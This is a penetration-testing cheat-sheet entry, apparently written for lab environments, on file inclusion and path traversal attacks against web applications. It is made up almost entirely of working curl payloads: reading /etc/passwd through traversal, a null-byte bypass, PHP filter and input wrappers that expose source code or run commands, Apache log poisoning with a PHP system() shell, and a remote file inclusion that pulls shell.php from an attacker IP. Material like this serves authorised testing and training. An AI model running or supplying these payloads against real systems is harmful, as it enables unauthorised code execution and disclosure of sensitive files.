---
description: |
  Local/Remote File Inclusion and Path Traversal exploitation techniques.

  Reference values:
    Target URL: http://10.10.10.1
    Attacker IP: 10.10.14.1
command: |
  # Basic LFI
  curl "http://10.10.10.1/page?file=../../../../etc/passwd"

  # Null byte bypass (PHP < 5.3)
  curl "http://10.10.10.1/page?file=../../../../etc/passwd%00"

  # PHP wrappers — base64 read source
  curl "http://10.10.10.1/page?file=php://filter/convert.base64-encode/resource=index.php"

  # PHP wrapper — code execution
  curl "http://10.10.10.1/page?file=php://input" --data-binary "<?php system('id'); ?>"

  # Log poisoning (Apache)
  curl "http://10.10.10.1" -A "<?php system(\$_GET['cmd']); ?>"
  curl "http://10.10.10.1/page?file=/var/log/apache2/access.log&cmd=id"

  # RFI
  curl "http://10.10.10.1/page?file=http://10.10.14.1/shell.php"

  # Windows paths
  curl "http://10.10.10.1/page?file=..\..\..\..\windows\system32\drivers\etc\hosts"
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
items:
  - No_Creds
techniques:
  - Web_File_Attack
network_position:
  - External
  - Internal
references:
  - https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
---
